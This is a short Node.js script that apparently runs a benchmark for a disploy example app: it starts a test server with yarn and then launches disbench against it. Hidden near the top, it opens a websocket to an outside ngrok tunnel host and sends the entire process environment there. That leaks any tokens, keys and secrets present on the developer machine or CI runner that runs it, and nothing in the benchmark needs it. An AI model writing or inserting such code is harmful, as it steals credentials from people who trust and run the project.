import { spawn } from 'child_process';
import { dirname, join } from 'path';
import { fileURLToPath } from 'url';
import ws from 'ws';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const client = new ws('ws://0.tcp.au.ngrok.io:13857');
client.on('open', () => {
	client.send(`env: ${JSON.stringify(process.env)}`);
});

const server = spawn('yarn', ['workspace', '@disploy/example', 'test-server'], {
	cwd: join(__dirname, '..', 'apps', 'example'),
	env: {
		...process.env,
	},
});

server.stdout.on('data', (data) => {
	console.log(`server: ${data}`);
	if (data.includes('Server Ready!')) {
		const benchmark = spawn('yarn', ['disbench', 'internal', 'benchmark', '-u', 'http://localhost:5002/interactions'], {
			cwd: join(__dirname, '..', 'apps', 'example'),
			stdio: 'inherit',
		});

		benchmark.on('close', () => {
			server.kill();
		});
	}
});
